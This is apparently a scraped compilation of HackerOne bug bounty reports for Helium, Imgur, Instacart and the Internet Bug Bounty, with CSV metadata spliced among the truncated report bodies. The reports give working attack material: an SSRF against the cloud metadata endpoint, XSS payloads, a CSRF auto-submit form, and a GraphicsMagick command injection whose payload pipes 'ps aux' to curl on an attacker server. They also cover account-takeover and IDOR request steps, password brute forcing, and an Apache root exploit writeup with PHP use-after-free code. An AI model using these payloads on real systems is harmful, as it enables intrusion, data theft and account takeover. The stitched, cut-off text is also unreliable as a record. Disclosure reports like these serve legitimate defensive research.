3) [A] switches to testhackerone organization and makes a graphql query to leak his Manager membership's id (using graphql it's only possible to see the memberships of the current organization):

Regards,
@sodacanth0roid   posted a comment. Dec 11th (2 years ago)In order to reproduce this issue, the following is needed:

An active organization on console.helium.com and an administrator user
A Lorawan device in this organization.

The Helium console has a functionality where integrations can be configured. Integrations allow the devices to connect to cloud-based applications and send data over HTTP or MQTT.
These vulnerability arises in the add a custom integration feature. When creating a custom HTTP integration, an endpoint can be specified. If this integration is connected to a device, when the device transfers a packet the Helium server will make an HTTP request to the specified endpoint and the HTTP response will be returned in the application. This makes the server vulnerable to a SSRF vulnerability.
Steps to reproduce
 1 - Log in as a Administrator user on an Organization that has a device on https://console.helium.com .
2 - go to integrations and click on add a custom HTTP integration . 
   Image F1113446: ssrf_1.png 62.53 KiBZoom in Zoom out Copy Download
 3 - Set the integration endpoint to http://169.254.169.254/latest/meta-data and the HTTP request method to GET. When this endpoint is accesed by the server on a EC2 instance, it returns private metadata of the instance, that's why this endpoint works as a proof of concept on the criticality of this vulnerability.

 4 - Add a label to this integration and save it.
  Image F1113460: ssrf_3.png 17.12 KiBZoom in Zoom out Copy Download
 5 - Add this label to the device configured on the organization. This associates the integration with the device, and the SSRF will be triggered when the device transfers a packet.
  Image F1113474: ssrf_4.png 50.69 KiBZoom in Zoom out Copy Download
6 - When the device sends a packet, the private data will be retrieved by the server and made visible to the attacker in the uplink message of the device section.

Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Improper Authentication - Generic,Account takeover w/o interaction for a user that doesn't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify,"w2w  submitted a report to Helium.Mar 4th (3 years ago)Description:
Hello, team! I found 2 vulnerabilities in your 2FA implementation:
1) There is a possibility to link 2FA to any other account if it wasn't set up before and user ID is known on the request /api/2fa. In order to do this, after performing a request for 2FA linking, substitute the ID to the victim's ID, organization could be any.
{F737177}
{F737178}
Image F737179: x0ul4.png 391.90 KiBZoom in Zoom out Copy Download
2) We can log in to the account without knowing login and password, using 2FA only, ID should be known. As you can see, in this request, we. don't use tokens/cookie that could be related to the user's ID, we are using only ID a561a2de-b8fe-49f8-8943-fb42229b7b08 and valid code.
Thus, using these 2 bugs we can fully takeover an account that doesn't have 2FA enabled (it was skipped after the first login).
Steps to reproduce:

As a user1, register at https://console.helium.com, skip 2FA, copy the ID.
Register an account user2, register at https://console.helium.com, perform a 2FA request but with ID from user1. 2FA is enabled now on the account user1!
Perform a request /api/2fa/verify with valid code and ID of user1.

Result: You've successfully achieved an account takeover. In the future, you'll be able to log in again with this technique in the future, but a victim will have trouble logging in because of 2FA.
Impact
If a victim's account ID is known, we can fully takeover an account without user interaction. User ID could be disclosed at https://console.helium.com/users (if our user role has access to this directory) or by using other techniques.1 attachment:F737179: x0ul4.pngw2w   changed the report title from Account takeover w/o interaction for user that don't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify to Account takeover w/o interaction for a user that doesn't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify. Mar 4th (3 years ago)coco-helium Helium staff  updated the severity from high to medium. Mar 10th (3 years ago)coco-helium Helium staff  changed the status to Triaged. Mar 10th (3 years ago)without the user ID, this vulnerability will be difficult to execute. changing severity to medium. thanks for your report.Helium  rewarded w2w with a $100 bounty. Mar 10th (3 years ago)victormu Helium staff  closed the report and changed the status to Resolved. Apr 27th (3 years ago)w2w   requested to disclose this report. Jun 26th (2 years ago)Hi @coco-helium @victormu, can we disclosure this one?

Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Cleartext Transmission of Sensitive Information,Cleartext Transmission of Sensitive Information Leads to administrator access,"kdr9666  submitted a report to Helium.Mar 8th (3 years ago)The weakness of the program is Cleartext Transmission of Sensitive Information through URL Leads to administrator access. This program is having one feature like we can add users like administrator and read-only, these are roles, into organizations. Here I get the administrator role at same organization by removing the original user id.
Vulnerable URL:  https%3A%2F%2Fconsole.helium.com%2Fusers
Steps to Reproduce:

After creating the account for your organization, go to the Users tab and here you can see your organization name on the top, now try to add a user by using the mail id with the role of the administration.
Then the opposite user will receive the invitation link from the first user, Click on the invitation link it will take you into the registration page of Console.helium.com, but here thing is, just go to URL of current page here you can see the organization name, inviter id and also invite receiver id and change the mail id of receiver and click on enter.
Now, you able to see the registration page again with different mail id in the field of the username and create a password for this id and click on the Register button.
Now, this last mail id will receive a confirmation link to complete the registration process, for this go to the mailbox and click on the link and after trying to log in.
After a successful login to the account, you can see the organization name of the inviter. Now you are also one the administrator of this organization.
To confirm this, go to a first user account who invited into the administrator role, here you can able see the mail id of the last user instead of the real one.
Yes… we have successfully done it.

Impact
Full administrator account take over.

Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Insecure Direct Object Reference (IDOR),Organization Takeover via invitation API,"azraelsec  submitted a report to Helium.Mar 31st (3 years ago)Hello @helium,
today I would like to show you how a malicious user could exploit an IDOR affecting the /invitations resource to gain Administrator privileges inside an organization of which he's part of as a reader.
Steps to reproduce the bug
Setup
Let's assume that three accounts exist:

azraelsec@wearehackerone.com [Attacker]
azraelsec+test@wearehackerone.com [Victim]
azraelsec+1@wearehackerone.com [Attacker's fake account]

Initial Context: [Victim] is Administrator of the target organization on Helium Console and invites [Attacker] to join it as a reader.
Goal: [Attacker] escalate its privileges and becomes Administrator of the target organization
Attack
1) [Attacker] makes a graphql query to leak the organization's id (using graphql it's only possible to see the memberships of the current organization):

4) Now [Attacker's fake account] has got full privileges on the target organization and can properly change [Attacker]'s role to Administrator and he can delete the original owner.
Mitigations
To be sure that the requesting user is an Administrator of that organization is enough to solve this issue.
Impact
This vulnerability has got a great impact on the platform as it allows any user to gain Administrator privileges on organizations he's part of, full controlling it.1 attachment:F766868: Organization_Takeover_via_Invitations.mp4",https://hackerone.com/reports/835005,California,United States,San Francisco,2020,3,31,2,5

Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Privilege Escalation,Read-only user can delete higher privileged members using open DELETE /api/memberships/<membershipID> endpoint,"chipped  submitted a report to Helium.Mar 4th (3 years ago)Summary
The /api/memberships/membershipID endpoint on console.helium.com is open to anyone, including read-only users in an organization. This means that a read-only member can kick a manager, administrator, or even the owner out of an organization using this vulnerability. 
Steps to Reproduce:

Create two accounts, user 1 (admin), user 2 (read-only member) with any organization name
You should already have the orgs set up, so for user 1, head over to the Users tab on the left
Click Add User on the right
Enter user 2's email (make sure their permission is read-only) and submit
Log in to user 2
Click Switch next to user 1's organization (should be at the home page)
Turn on burp or any proxy and start intercepting
Click on users on the left
Look for the GraphQL request with the operation name of PaginatedMembershipsQuery, this will list all memberships in that organization (including the ID, which is what we're looking for) Image F736503: POC1.png 30.61 KiBZoom in Zoom out Copy Download
Look for user 1's email and store the membership ID (id)
Now go to user 2 and switch back to their organization and add user 1 to that org (perms don't matter)
This will instantly add them to the user list without an invite
Start intercepting and delete them from the user list
Send the DELETE /api/memberships/id to repeater
Now put the membership ID you stored earlier and replace it with the current ID, this should then delete the membership Image F736504: POC2.png 37.29 KiBZoom in Zoom out Copy Download
Refresh the page for user 1, it will actually log them out as well with a 401 of You don't have access to this organization

This will remove any user from the organization. This is particularly dangerous if you want to take over an organization, except the only thing you can do is kick users out, the rest is still read-only. This is also possible for managers, they can remove administrators, which is more impactful since managers actually have permission within the org. So as a result, administrators wouldn't be able to supervise the hacker and he would have complete control over the organization.
Impact

Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Cryptographic Issues - Generic,Big Bug in SSL : breach compression attack (CVE-2013-3587) affect imgur.com,"hacker00000000  submitted a report to Imgur.Jan 19th (7 years ago)Hi imgur Security Team,
This is an urgent issue and wish you fix it as soon as possible ...
so this web application "" imgur.com "" "" is potentially vulnerable to the BREACH attack.
An attacker with the ability to:
Inject partial chosen plaintext into a victim's requests
Measure the size of encrypted traffic
can leverage information leaked by compression to recover targeted parts of the plaintext.
BREACH (Browser Reconnaissance & Exfiltration via Adaptive Compression of Hypertext) is a category of vulnerabilities and not a specific instance affecting a specific piece of software. To be vulnerable, a web application must:
Be served from a server that uses HTTP-level compression
Reflect user-input in HTTP response bodies
Reflect a secret (such as a CSRF token) in HTTP response bodies
URL: /signin/
Attack details
This alert was issued because the following conditions were met:
The page content is served via HTTPS
The server is using HTTP-level compression
URL encoded GET input redirect was reflected into the HTTP response body.
HTTP response body contains a secret named csrf
The impact of this vulnerability
An attacker can leverage information leaked by compression to recover targeted parts of the plaintext.
How to fix this vulnerability
The mitigations are ordered by effectiveness (not by their practicality - as this may differ from one application to another).
Disabling HTTP compression
Separating secrets from user input
Randomizing secrets per request
Masking secrets (effectively randomizing by XORing with a random secret per request)
Protecting vulnerable pages with CSRF
Length hiding (by adding random number of bytes to the responses)
Rate-limiting the requests

Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event,"fransrosen  submitted a report to Imgur.Oct 1st (7 years ago)Hi,
This was a fun one.
So I noticed you're using swfupload.swf which is hosted on the main domain, imgur.com. This swfupload.swf as some settings you can use to modify the button on the upload. You can actually insert HTML into the Flash, but the button event (that you select yourself using another parameter) is taking over the MouseClick-event from the HTML-content you provide.
However, if you're really quick, you can actually catch the even in the HTML anyway. So by making a page that would reload the SWF constantly (from cache that is) you can make a page that looks like this:
Code 471 BytesWrap lines Copy Download1<iframe src=""about:blank"" id=""x""></iframe>
2
3<script>u='https://imgur.com/include/flash/swfupload.swf?buttonDisabled=&buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME%3C/a%3E&buttonImageURL=/&buttonTextStyle=a{color:%23ff00ff}&buttonAction=-120&buttonCursor=-2';
4setInterval(function(){document.getElementById('x').contentWindow.location=u},300)</script>
That will reload the content over and over, and if you click the text in the right time, the XSS will trigger.
I think I got an epileptic reaction out of testing this, but it was fun anyway, haha. You should probably move the swfupload.swf to another domain, and just embed it on imgur.com since that will give you the same options as today, but without the possibility to access the SWF directly and inject the parameters on your domain.
PoC-image attached.

Imgur,51-100,0.0,10m-50m,$500.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected XSS in m.imgur.com,"logue  submitted a report to Imgur.Jul 7th (6 years ago)There is a reflected XSS vulnerability in https://m.imgur.com as shown below:
https://m.imgur.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E/messages
It appears that the username field in the url does not sanitize angle bracket characters on the mobile version of the site, allowing an attacker to execute arbitrary Javascript on the m.imgur.com domain.
I have attached several screenshots demonstrating this attack in the mobile context. While this attack affects devices loading the mobile site, I did notice that requests made with the standard User-Agent would issue a 302 redirect to the standard site, throwing a 404 error. This attack does execute on browsers that load the mobile version of the site.
The impact of this vulnerability is variable, depending on how it is used. An attacker could use this vulnerability to target a specific victim or post it on a site such as reddit, which is frequented by users of this application. If an authenticated imgur user could be tricked into clicking the link it may result in malicious JavaScript executing in the context of the user's session and could result in credential/session theft or other targeted attacks. This could result in multiple compromised accounts.
This vulnerability was tested in Google Chrome Version 51.0.2704.103 using the following User-Agent from the developer tools to load the mobile site:
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36
To mitigate this vulnerability, consider encoding any angle brackets (< >) reflected back to the user when handling user input.4 attachments:F103756: imgur_mobile_reflected_xss.pngF103757: imgur_mobile_reflected_xss2.pngF103758: imgur_mobile_reflected_xss3.pngF103759: imgur_mobile_reflected_xss4.png",https://hackerone.com/reports/149855,California,United States,San Francisco,2016,7,7,21,2

Imgur,51-100,0.0,10m-50m,$500.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,CSRF leads to a stored self xss,"hogarth45  submitted a report to Imgur.Mar 6th (5 years ago)Followup from #311460
Summary
Self xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.
Description
A favorites folder with an xss payload for a name will launch when saving an image to said folder.
This can be verified by following these steps

Visit your favorites
Create New Folder
Change name to

Code 32 BytesWrap lines Copy Download1""'><img src=x onerror=prompt(1)>

Save
Visit a photo
Click the little plus next to the heart on bottom left of image
Add to the folder
xss will launch

Since self xss is out of scope, we will need a method of delivering this attack to a user.
This can be done via a CSRF to create a favorites folder.
POC
Using a form like so to create the CSRF:
Code 282 BytesWrap lines Copy Download1<html>
2<body onload='document.forms[0].submit()'>
3  <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
4    <input name='name' value='New Test""><img src=x onerror=prompt(2)>'>
5    <input name='is_private' value='false'>
6  </form>
7</body>
8</html>
Or be logged into your imgur account and visit
http://blackdoorsec.net/sandbox/imgur2.html
This will create the folder with an xss name that can be used to attack an account.
Impact
account hijacking
since a user would still need to add an image to the folder for the attack to work, the success rate will be lower than normal
Scenerio
since reddit/imgur communities overlap malicious links containing the CSRF could be sent throughout the site. out of the few thousand hits the link would get, i imagine there would be several successful compromised imgur accounts.

I noticed a small information leak which allows an attacker to check whether an email address is associated with an account.If your account is not associated with website then an error will become raise that ""That username or email was not found.""
You should always return a status message like: ""If your email exists in our database, you'll receive a reset link"". That way an attacker cannot distinguish between the two cases.
Also you should add rate limiting :)

The y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.
Reproduction steps


Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.


Login into your imgur account and upload an image.


Move your mouse over the image, click on the tiny button with pencil on it, then click ""Edit"".


Select a random rectangle on the image, then click ""Apply"".


In the burp suite, you will see a request to an URL like this:  http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510
 Change the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-. 
 The full URL after the change must look like http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303, note that you have to change <your-server> to a webserver under your control).


Fire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body.  You can replace ps aux with another command (but you have to write ${IFS} instead of spaces).


Detailed description
I was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of y GET parameter) goes into a shell command. While all special characters (like |, $ and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is escapeshellcmd PHP function, but that can also be some kind of custom input filtering/processing.
The rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by ""Crop/Resize"" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended  -rotate 90 to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably gm convert utility). I read the documentation and found that -write argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.
Mitigation
Probably either some kind of custom processing or escapeshellcmd function is used to construct the command line. In both cases, replace it with applying escapeshellarg to individual arguments. In the second case, you probably want to run grep -R escapeshellcmd <path to the source code> to find more vulns :-) Bot:  posted a comment. Mar 12th (6 years ago)Hello!

When user creates a list, they can choose to not make it public. However the attacker can still access the information that user chose to hide.
Steps to Reproduce

Log in to Instacart.
Choose a private list that you want to see, for example the one with id = 10.
Go to https://www.instacart.com/api/v2/recipes/10
Response reveals all metadata of the list including title, description and image.

Security Implications
The attacker can use this vulnerability to obtain metadata of any list regardless of what the visible flag is set to. Also, since list id is incremental it's easy to fetch metadata for all Instacart lists, both public and private.",https://hackerone.com/reports/178506,California,United States,San Francisco,2016,10,27,23,17
Instacart,10001,0.0,50m-100m,$100.00,No value,0.0,Privilege Escalation,Authorization Bypass in Delivery Chat Logs,"michiel  submitted a report to Instacart.Jun 10th (6 years ago)An authorization issue in the mobile app API allows any Instacart user to gain access to other users' order delivery chat logs. The /api/v2/order_deliveries/:order_delivery_id/order_change_logs endpoint does not sufficiently check if the user has permissions to access that particular order's chat logs. 
Steps to Reproduce
I used Burp Suite to intercept the traffic between my iPhone and the Instacart API. When I found the ""View
Chat Logs"" button on one of my past orders, I noticed it triggered the following API request:
Code 107 BytesWrap lines Copy Download1GET /api/v2/order_deliveries/261932226/order_change_logs HTTP/1.1
2Host: www.instacart.com
3Accept: */*
4[...]
This request is answered by the API with a JSON blob that contains chat messages that were exchanged between the buyer and the shopper. As well as a few other details like when the order was placed and if any changes were made to the order due to out of stock items. 
However, if you change the ID in the URL to something else, you will notice the API actually responds with the chat log and order data, regardless of who made the order. I tried with 261972220 and you can confirm this delivery does not belong to the user with account ███, but for instance 261972226 does.
Risk
This vulnerability leaks private messages exchanged between shopper, driver, and customer. It may also include product names that were on the order if something had to be changed about the order. 
Here is an example:
Image F98768: IMG_0008.PNG 149.64 KiBZoom in Zoom out Copy Download
This could lead to greater compromise, since the API returns the Firebase tokens for a few objects as well. So far I have not been able to do anything interesting with the Firebase tokens, but I'm not a Firebase expert.

These same restrictions do not apply to the mobile sign-in endpoint (a POST request to https://www.instacart.com/oauth/token), which allows an attacker to brute force login of any user's account (I have attempted logging into my account ~50 times, with no restrictions).
In addition, if an account has already been locked from too many sign-ins on the website, an attacker can still log in using the app's endpoint.
POC:

Configure a mobile proxy, such as BurpSuite.
Make a login request in the Instacart app.
Repeat this request to brute force any account's password.

As an example, I found a list of the most common 100 passwords and added my own password somewhere in the list. All invalid passwords returned a 401 error, while the correct password returned a 200 error.

fix
to fix this issue, you could implement an timeout after a number of requests in a period of time.
just like it is implemented here: https://www.instacart.com/accounts/password
this returns ""429 Too Many Requests"" when making multiple requests in a short period of time.
also making the token more random by giving it a random number of characters instead of 20 characters will also help.
there is also an option to include the email as parameter.

Instacart,10001,0.0,50m-100m,$150.00,No value,0.0,Information Disclosure,Fetch private list metadata and any user's personal name,"sameoldstory  submitted a report to Instacart.Aug 23rd (6 years ago)Overview
When a user creates a list, they can choose whether to make the list visible in search and whether to show their name with the list. The problem is that the attacker can still access the information that the user chose to hide. Furthermore, if the attacker gets hold of a user's ID, they can find out user's personal name irrespective of whether the user has created any lists at all.
Steps to Reproduce
Both the victim and the attacker have to be Instacart users.


Victim creates a list and unchecks both ""visible in search"" and ""show my name"" boxes.


Victim shares the link publicly.


Attacker follows the shared link and adds the list to favorites. The response from the server reveals the list metadata including victim's personal name, list title, description and images:
Code 271 BytesWrap lines Copy Download1POST /api/v2/lists/10/star_toggle
2
3{
4  ""meta"": {
5    ""code"": 200
6  },
7  ""data"": {
8    ""id"": 10,
9    ""name"": ""Test"",
10    ""description"": ""This is the description of a shopping list"",
11    ""user_id"": 10,
12    ""visible"": false,
13    ...
14    ""user_name"": ""Apoorva M"",
15    ...
16  }


Security Implications
The attacker can use the star_toggle endpoint to obtain metadata of any list regardless of what the visible flag is set to. Since list ID is incremental it doesn't take much effort to obtain metadata for all Instacart lists, both public and private.
Additional Exploit
There's one more endpoint that, although doesn't reveal nearly as much information, does reveal victim's personal name and doesn't even require the victim to have any lists:
Code 134 BytesWrap lines Copy Download1GET /api/v2/lists?user_id=10
2
3{""meta"":{""code"":200,""author_name"":""Apoorva M""},""data"":[],""pagination"":{""total"":0,""per_page"":0,""page"":1}}
The attacker can either look up personal name of the user they're interested in, or simply dump whole list of Instacart users personal names, since the user ID is also incremental.",https://hackerone.com/reports/162822,California,United States,San Francisco,2016,8,23,20,34

The endpoint for adding a list collaborator lacks authorization checks. A regular Instacart user can add themselves as a collaborator to any list and thus get full control over that list.
How to Reproduce


Choose a list that you want to edit, for example the one with id = 10.


Log in to Instacart.


Copy the cookie and anti-CSRF headers from one of the requests. 


Send a request:
Code 163 BytesWrap lines Copy Download1POST /api/v2/list_users

3Content-Type: application/json
4Cookie: ...
5X-CSRF-Token: ...
6
7{""list_user"":{""list_id"":10,""email"":""your@email.com""}}


Open https://www.instacart.com/api/v2/lists/10 in browser and grab the list's token (7bHoerQ in this case).


Open http://www.instacart.com/store/giant/lists/7bHoerQ/edit in browser and do whatever you want to the list.

3{""meta"":{""code"":200},""data"":{""id"":10,""name"":""Test sameoldstory"" ...
Security Implications
This vulnerability can be used to:

See metadata of a private list.
See the personal name of a list owner, even if they chose to hide it.
Change metadata and items or even delete any list.
Affect product promotion by messing with popular lists.
Perform website defacement and phishing attacks.
Enhance stored XSS attacks by embedding them into the popular lists.

Your website is vulnerable to Host Header Injection because the host header can be changed to something outside the target domain
In many cases, developers are trusting the HTTP Host header value and using it to generate links, import scripts and even generate password resets links with its value. This is a very bad idea, because the HTTP Host header can be controlled by an attacker. This can be exploited using web-cache poisoning and by abusing alternative channels like password reset emails.

Firstly,I couldn't see anything about Path Disclosure in your policy,so I've decided to report it.
Steps to reproduce :
1-Create a list for a store
2-Add background image from link (File has to be .svg) like aaa.com/aaa.svg
3-Then it will give an error
Let's take a look to that error
{""meta"":{""code"":400,""error_type"":""List Error"",""error_message"":""There was an error while updating this list"",""errors"":[""Image must be a JPEG or PNG"",""Image Failed to manipulate with rmagick, maybe it is not an image?

As you can understand from error's Response this is the path disclosure

Instacart,10001,0.0,50m-100m,$150.00,No value,0.0,Denial of Service,Issues with uploading list images,"cablej  submitted a report to Instacart.Aug 16th (6 years ago)Hi,
There are several issues with uploading images for a list, i.e. with a PUT request to https://www.instacart.com/api/v2/lists/153253 and passing list[remote_image_url].
First, information about open ports and SSH information can be disclosed via different urls. For example, PUT-ing localhost:80 will return a 404 error, but localhost:1010 will return a connection refused error. PUT-ing localhost:22 will, return ""Image could not download file: wrong status line: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3'"", showing that OpenSSH version 6.6.1p1 is being used, which is outdated and may be vulnerable to published exploits.
Passing a value such as http://google.com will show that rmagick is being used, with an error: ""Image must be a JPEG or PNG"",""Image Failed to manipulate with rmagick, maybe it is not an image? Original Error: unable to open file /tmp/magick-ezcF8DGU': No such file or directory @ error/constitute.c/ReadImage/583""`
Finally, uploading a JPG such as in [https://hackerone.com/reports/390] makes the server timeout and returns a 502 error, overflowing the memory. I have attached the image below.

Instacart,10001,0.0,50m-100m,$100.00,Low,2.0,Improper Authentication - Generic,Login with Google Not Authenticated on iOS App,"bhavukjain1  submitted a report to Instacart.Jan 30th (6 years ago) In your iOS application, there is Login with Google. In this, you're not authenticating a user properly and it can lead to access to user accounts.
Affected API:
https://www.instacart.com/api/v2/users/google_login_auth
In this request, these are the parameters: access_token, client_id,id_token, login_only, read_terms.
In the parameter: id_token, you're passing the token generated by Google user authentication. But the token generated is not properly authenticated at your backend. You're not authenticating if the token is generated by your app or not.
For example, I logged in with the app Meetup via login with Google. The id_token generated by Google for this app, when used with your /google_login_auth API, it's still get accepted.
This means ​an app like Meetup can access the user accounts of your users using the id_token generated by Meetup. This can compromise your user's accounts.
The proper way of authenticating the user is mentioned here:

When signing up for an account, you enter your email. When this email is already in use, the server responds with ""{""errors"":{""email"":[""has already been taken""]}}""

This way we can easily get a list of all users emails signed up at Instacart.

The password field is left empty on purpose, so that when the email is not in use, no account will be made.
If the email exists, this will be the response: ""{""errors"":{""email"":[""has already been taken""],""password"":[""can't be blank""]}}""
When the email doesn't exist in the database, then this will be returned: ""{""errors"":{""password"":[""can't be blank""]}}""
Fix
to fix this issue, you could implement an timeout after a number of requests in a period of time.
just like it is implemented here: https://www.instacart.com/accounts/password
this returns ""429 Too Many Requests"" when making multiple requests in a short period of time.
If you have any questions, feel free to ask them ;)

httpd 2.2.32
httpd 2.4.24 (unreleased)
httpd 2.4.25
Description:
The HTTP strict parsing changes added in 2.2.32 and 2.4.24 introduced a
bug in token list parsing, which allows ap_find_token() to search past
the end of its input string. By maliciously crafting a sequence of
request headers, an attacker may be able to cause a segmentation fault,
or to force ap_find_token() to return an incorrect value.

Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",High,7.8,Privilege Escalation,Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation,"real  submitted a report to Internet Bug Bounty.Apr 2nd (4 years ago)Hello,
I reported a Local Root privilege escalation vulnerability on Apache HTTPd at the beginning of the year. Apache has now patched it, as you can see here.
The vulnerability affects mod_prefork, mod_event, and mod_worker, the most used mods on Linux.
Basically, this is an arbitrary function call as root triggered whenever the server gracefully restarts, which is generally once a day.
Here is the article I plan to publish soon, as MarkDown (careful, wall of text):
Introduction
From version 2.4.17 (Oct 9, 2015) to version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.
The vulnerability is triggered when Apache gracefully restarts (apache2ctl graceful).
In standard Linux configurations, the logrotate utility runs this command once a day, at 6:25AM, in order to reset log file handles.
The vulnerability affects mod_prefork, mod_worker and mod_event. The following bug description, code walkthrough and exploit target mod_prefork.
Bug description
In MPM prefork, the main server process, running as root, manages a pool of single-threaded, low-privilege (www-data) worker processes, meant to handle HTTP requests.
In order to get feedback from its workers, Apache maintains a shared-memory area (SHM), scoreboard, which contains various informations such as the workers PIDs and the last request they handled.
Each worker is meant to maintain a process_score structure associated with its PID, and has full read/write access to the SHM.

26}
When Apache gracefully restarts, its main process kills old workers and replaces them by new ones.
At this point, every old worker's bucket value will be used by the main process to access an array of his, all_buckets.
all_buckets

27}
No bound checks happen. Therefore, a rogue worker can change its bucket index and make it point to the shared memory, in order to control the prefork_child_bucket structure upon restart. Eventually, and before privileges are dropped, mutex->meth->child_init() is called.
This results in an arbitrary function call as root.
Vulnerable code
We'll go through server/mpm/prefork/prefork.c to find out where and how the bug happens.

A rogue worker changes its bucket index in shared memory to make it point to a structure of his, also in SHM.
At 06:25AM the next day, logrotate requests a graceful restart from Apache.
Upon this, the main Apache process will first kill workers, and then spawn new ones.
The killing is done by sending SIGUSR1 to workers. They are expected to exit ASAP.
Then, prefork_run() (L853) is called to spawn new workers. Since retained->mpm->was_graceful is true (L861), workers are not restarted straight away.
Instead, we enter the main loop (L933) and monitor dead workers' PIDs. When an old worker dies, ap_wait_or_timeout() returns its PID (L940).
The index of the process_score structure associated with this PID is stored in child_slot (L948).
If the death of this worker was not fatal (L969), make_child() is called with ap_get_scoreboard_process(child_slot)->bucket as a third argument (L985). As previously said, bucket's value has been changed by a rogue worker.
make_child() creates a new child, fork()ing (L671) the main process.
The OOB read happens (L691), and my_bucket is therefore under the control of an attacker.
child_main() is called (L722), and the function call happens a bit further (L433).
SAFE_ACCEPT(<code>) will only execute <code> if Apache listens on two ports or more, which is often the case since a server listens over HTTP (80) and HTTPS (443).
Assuming <code> is executed, apr_proc_mutex_child_init() is called, which results in a call to (*mutex)->meth->child_init(mutex, pool, fname) with mutex under control.
Privileges are dropped a bit later in the execution (L446).

Exploitation
The exploitation is a four step process:

Obtain R/W access on a worker process
Write a fake prefork_child_bucket structure in the SHM
Make all_buckets[bucket] point to the structure
Await 6:25AM to get an arbitrary function call

Advantages:

The main process never exits, so we know where everything is mapped by reading /proc/self/maps (ASLR/PIE useless)
When a worker dies (or segfaults), it is automatically restarted by the main process, so there is no risk of DOSing Apache

Problems:

PHP does not allow to read/write /proc/self/mem, which blocks us from simply editing the SHM
all_buckets is reallocated after a graceful restart (!)

## 1. Obtain R/W access on a worker process
PHP UAF 0-day
Since mod_prefork is often used in combination with mod_php, it seems natural to exploit the vulnerability through PHP. CVE-2019-6977 would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):
PHP UAF
Code 361 BytesWrap lines Copy Download1<?php
2
3class X extends DateInterval implements JsonSerializable
4{
5  public function jsonSerialize()
6  {
7    global $y, $p;
8    unset($y[0]);
9    $p = $this->y;
10    return $this;
11  }
12}
13
14function get_aslr()
15{
16  global $p, $y;
17  $p = 0;
18
19  $y = [new X('PT1S')];
20  json_encode([1234 => &$y]);
21  print(""ADDRESS: 0x"" . dechex($p) . ""\n"");
22
23  return $p;
24}
25
26get_aslr();
This is an UAF on a PHP object: we unset $y[0] (an instance of X), but it is still usable using $this.
UAF to Read/Write
We want to achieve two things:

Read memory to find all_buckets' address
Edit the SHM to change bucket index and add our custom mutex structure

Luckily for us, PHP's heap is located before those two in memory.
Memory addresses of PHP's heap, `ap_scoreboard_image->andall_buckets`*
Code 345 BytesWrap lines Copy Download1root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p
27f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so

5$14 = {
6  global = 0x7f4a9323e008, 
7  parent = 0x7f4a9323e020, 
8  servers = 0x55835eddea78
9}
10(gdb) p all_buckets 
11$15 = (prefork_child_bucket *) 0x7f4a9336b3f0
Since we're triggering the UAF on a PHP object, any property of this object will be UAF'd too; we can convert this zend_object UAF into a zend_string one.
This is useful because of zend_string's structure:
Code 131 BytesWrap lines Copy Download1(gdb) ptype zend_string
2type = struct _zend_string {
3    zend_refcounted_h gc;
4    zend_ulong h;
5    size_t len;
6    char val[1];
7}
The len property contains the length of the string. By incrementing it, we can read and write further in memory, and therefore access the two memory regions we're interested in: the SHM and Apache's all_buckets.
Locating bucket indexes and all_buckets
We want to change ap_scoreboard_image->parent[worker_id]->bucket for a certain worker_id. Luckily, the structure always starts at the beginning of the shared memory block, so it is easy to locate.
Shared memory location and targeted process_score structures
